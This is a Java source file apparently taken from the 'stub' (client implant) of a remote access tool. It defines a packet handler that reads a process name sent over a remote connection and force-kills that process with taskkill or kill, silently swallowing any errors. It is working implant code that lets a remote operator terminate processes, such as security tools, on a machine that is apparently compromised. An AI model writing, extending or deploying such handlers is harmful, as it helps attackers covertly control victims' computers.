package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;

public class PacketKILLPROCESS extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String process = Connection.readLine();
		
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(new String[] { "taskkill", "/f", "/im", process });
			} else {
				Runtime.getRuntime().exec("kill " + process);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
